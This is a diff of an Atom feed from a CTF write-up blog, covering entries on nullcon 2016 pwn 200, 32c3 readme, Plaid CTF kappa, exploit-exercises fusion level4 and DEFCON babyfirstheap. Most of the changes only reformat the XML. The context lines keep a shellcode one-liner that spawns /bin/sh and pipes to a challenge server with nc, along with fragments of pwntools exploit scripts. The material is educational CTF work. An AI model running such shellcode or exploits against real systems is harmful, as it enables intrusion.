@@ -1,24 +1,32 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[pwn_expoit Blog]]></title>
-  <link href="http://naver.com/atom.xml" rel="self"/>
-  <link href="http://naver.com/"/>
-  <updated>2016-02-06T19:25:12-08:00</updated>
-  <id>http://naver.com/</id>
-  <author>
-    <name><![CDATA[pwn_expoit]]></name>
-    <email><![CDATA[pwn_expoit@naver.com]]></email>
-  </author>
-  <generator uri="http://octopress.org/">Octopress</generator>
+	<title><![CDATA[pwn_expoit Blog]]></title>
+	<link href="http://naver.com/atom.xml" rel="self"/>
+	<link href="http://naver.com/"/>
+	<updated>2016-02-13T01:56:07-08:00</updated>
+	<id>http://naver.com/</id>
+	<author>
+		<name><![CDATA[pwn_expoit]]></name>
+		<email><![CDATA[pwn_expoit@naver.com]]></email>
+	</author>
+	<generator uri="http://octopress.org/">Octopress</generator>
 
-  
-  <entry>
-    <title type="html"><![CDATA[2016 nullcon pwn 200]]></title>
-    <link href="http://naver.com/blog/2016/01/31/2016-nullcon-pwn-200/"/>
-    <updated>2016-01-31T17:35:45-08:00</updated>
-    <id>http://naver.com/blog/2016/01/31/2016-nullcon-pwn-200</id>
-    <content type="html"><![CDATA[<p>recently, I challenge nullcon 2016. when hold ctf, i catched pwnable.However, pwn 100 is arm exploit that i can&rsquo;t solve. So i decide to challengepwn 200.<br>
+	
+	<entry>
+		
+			<title type="html"><![CDATA[2016 nullcon pwn 200]]></title>
+		
+		<link href="http://naver.com/blog/2016/01/31/2016-nullcon-pwn-200/"/>
+		<updated>2016-01-31T17:35:45-08:00</updated>
+		<id>http://naver.com/blog/2016/01/31/2016-nullcon-pwn-200</id>
+		<content type="html">
+			<![CDATA[
+				
+					<p></p>
+				
+			]]>
+			<![CDATA[<p>recently, I challenge nullcon 2016. when hold ctf, i catched pwnable.However, pwn 100 is arm exploit that i can&rsquo;t solve. So i decide to challengepwn 200.<br>
 at frist, pwn 200 seem very easy:) . analyzing it, i think that this is sandbox. it was first time for me. <br></p>
 
 <h2>Analysis<br></h2>
@@ -216,15 +224,24 @@ i saved stack. then stack overwrite rip :P.
 (python -c 'print ("\x0e")'; python -c 'print (open("shell.bin").read()+"A"*2360)'; python -c 'print ("\x0e"+"\x60\x02\x00\x00"+"http://"+"\x90"*(0x220-49)+"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"+"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"+"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"+"\x58\x0f\x05"+"C"*8+"\x6c\x11\x40"+"\x00"*5)';cat)|nc 52.72.171.221 9982
 </code></pre>
 
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[32c3 pwn[200] readme write up]]></title>
-    <link href="http://naver.com/blog/2015/12/31/32c3-pwn-200-readme-write-up/"/>
-    <updated>2015-12-31T07:16:00-08:00</updated>
-    <id>http://naver.com/blog/2015/12/31/32c3-pwn-200-readme-write-up</id>
-    <content type="html"><![CDATA[<p>after 32c3 ctf, i am sorry that sovled readme. so i challenge it again
+]]>
+		</content>
+	</entry>
+	
+	<entry>
+		
+			<title type="html"><![CDATA[32c3 pwn[200] readme write up]]></title>
+		
+		<link href="http://naver.com/blog/2015/12/31/32c3-pwn-200-readme-write-up/"/>
+		<updated>2015-12-31T07:16:00-08:00</updated>
+		<id>http://naver.com/blog/2015/12/31/32c3-pwn-200-readme-write-up</id>
+		<content type="html">
+			<![CDATA[
+				
+					<p></p>
+				
+			]]>
+			<![CDATA[<p>after 32c3 ctf, i am sorry that sovled readme. so i challenge it again
 this binary is likely to analysis,but i am too stupid to can&rsquo;t solved</p>
 
 <figure class='code'><figcaption><span>[main func] (readmemain.c)</span> <a href='http://naver.com/codeview/readmemain.c'>download</a></figcaption>
@@ -460,15 +477,24 @@ above the environment variable it make that show error messege on remote server<
 </span><span class='line'><span class="n">interact</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure>
 
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Plaid ctf kappa[275] in 2014]]></title>
-    <link href="http://naver.com/blog/2015/12/26/plaid-ctf-kappa-275-in-2014/"/>
-    <updated>2015-12-26T01:13:36-08:00</updated>
-    <id>http://naver.com/blog/2015/12/26/plaid-ctf-kappa-275-in-2014</id>
-    <content type="html"><![CDATA[<p>i recently prepare Codegate held in 2016,So i needed to write up ctf. i writed up ezhp(plaid ctf), now it&rsquo;s time to write up kappa. Let&rsquo;s start breaking kappa</p>
+]]>
+		</content>
+	</entry>
+	
+	<entry>
+		
+			<title type="html"><![CDATA[Plaid ctf kappa[275] in 2014]]></title>
+		
+		<link href="http://naver.com/blog/2015/12/26/plaid-ctf-kappa-275-in-2014/"/>
+		<updated>2015-12-26T01:13:36-08:00</updated>
+		<id>http://naver.com/blog/2015/12/26/plaid-ctf-kappa-275-in-2014</id>
+		<content type="html">
+			<![CDATA[
+				
+					<p></p>
+				
+			]]>
+			<![CDATA[<p>i recently prepare Codegate held in 2016,So i needed to write up ctf. i writed up ezhp(plaid ctf), now it&rsquo;s time to write up kappa. Let&rsquo;s start breaking kappa</p>
 
 <p>Kappa is Pokemon Game binary</p>
 
@@ -925,15 +951,24 @@ this method can become vulnerability on UAF. for now, i perceived it vulnerabilt
 
 
 
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[exploit-exercise fusion level4]]></title>
-    <link href="http://naver.com/blog/2015/11/15/exploit-exercise-fusion-level4/"/>
-    <updated>2015-11-15T05:51:33-08:00</updated>
-    <id>http://naver.com/blog/2015/11/15/exploit-exercise-fusion-level4</id>
-    <content type="html"><![CDATA[<figure class='code'><figcaption><span>[fusion 4 only exploit] (fusion.py)</span> <a href='http://naver.com/codeview/fusion.py'>download</a></figcaption>
+]]>
+		</content>
+	</entry>
+	
+	<entry>
+		
+			<title type="html"><![CDATA[exploit-exercise fusion level4]]></title>
+		
+		<link href="http://naver.com/blog/2015/11/15/exploit-exercise-fusion-level4/"/>
+		<updated>2015-11-15T05:51:33-08:00</updated>
+		<id>http://naver.com/blog/2015/11/15/exploit-exercise-fusion-level4</id>
+		<content type="html">
+			<![CDATA[
+				
+					<p></p>
+				
+			]]>
+			<![CDATA[<figure class='code'><figcaption><span>[fusion 4 only exploit] (fusion.py)</span> <a href='http://naver.com/codeview/fusion.py'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -1268,15 +1303,24 @@ this method can become vulnerability on UAF. for now, i perceived it vulnerabilt
 </span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure>
 
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[2015 DEFCON babyfirstheap]]></title>
-    <link href="http://naver.com/blog/2015/11/15/2015-defcon-babyfirstheap/"/>
-    <updated>2015-11-15T04:21:48-08:00</updated>
-    <id>http://naver.com/blog/2015/11/15/2015-defcon-babyfirstheap</id>
-    <content type="html"><![CDATA[<p>This binary how to using doubler free bug rather than finding vuln '</p>
+]]>
+		</content>
+	</entry>
+	
+	<entry>
+		
+			<title type="html"><![CDATA[2015 DEFCON babyfirstheap]]></title>
+		
+		<link href="http://naver.com/blog/2015/11/15/2015-defcon-babyfirstheap/"/>
+		<updated>2015-11-15T04:21:48-08:00</updated>
+		<id>http://naver.com/blog/2015/11/15/2015-defcon-babyfirstheap</id>
+		<content type="html">
+			<![CDATA[
+				
+					<p></p>
+				
+			]]>
+			<![CDATA[<p>This binary how to using doubler free bug rather than finding vuln '</p>
 
 <div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0x13</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
   <span class="p">{</span>
@@ -1478,7 +1522,8 @@ this method can become vulnerability on UAF. for now, i perceived it vulnerabilt
 
 
 
-]]></content>
-  </entry>
-  
+]]>
+		</content>
+	</entry>
+	
 </feed>
